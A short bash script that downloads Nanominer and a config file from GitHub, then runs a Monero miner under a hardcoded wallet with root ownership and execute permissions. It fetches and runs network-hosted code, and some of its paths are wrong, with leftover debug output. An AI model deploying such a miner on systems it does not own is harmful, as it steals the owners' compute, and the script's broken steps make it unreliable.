#!/bin/bash
echo "Starting script"
# Download Nanominer
wget https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz
mkdir nanominer
# Extract into a folder called "nanominer"
tar -xzf nanominer-linux-3.7.6.tar.gz -C nanominer

# Get the timestamp 
timestamp=$(date +%s)

rm nanominer/config_xmr.ini
# Download the file "/nanominer/config_xmr.ini" from the following address "https://github.com/djayzone/kube_nanominer/blob/main/config_xmr.ini" 
wget https://raw.githubusercontent.com/djayzone/kube_nanominer/main/config_xmr.ini -O nanominer/config_xmr.ini

# Replace the rigName with a timestamp
sed -i "s/rigName = djayzonewave/rigName = djayzonewave_$timestamp/" nanominer/config_xmr.ini

echo "End config"

echo "start nanominer"
ls -l nanominer > droit.txt
cat droit.txt
./nanominer -algo randomx -wallet 44iLhbGuyJTbkkKNR8kun3PDMZT7b3pFjJ2NbY888ruQWxC5st19A6B1N2ks1LmEfJDW9jXoW1sfTAfHZdDrSoKGQ3tm5d1 -coin xmr -rigName djay_$(date +'%s') -email contact@djayzone.com
chown -R root:root /nanominer
chmod -R +x /nanominer
ls -l nanominer > droit.txt
cat droit.txt
echo "retry start nanominer"
ls -l  > droit.txt
cat droit.txt
chown root:root ./nanominer
chmod +x ./nanominer
./nanominer -algo randomx -wallet 44iLhbGuyJTbkkKNR8kun3PDMZT7b3pFjJ2NbY888ruQWxC5st19A6B1N2ks1LmEfJDW9jXoW1sfTAfHZdDrSoKGQ3tm5d1 -coin xmr -rigName djay_$(date +'%s') -email contact@djayzone.com
sleep 360
echo "BUG"
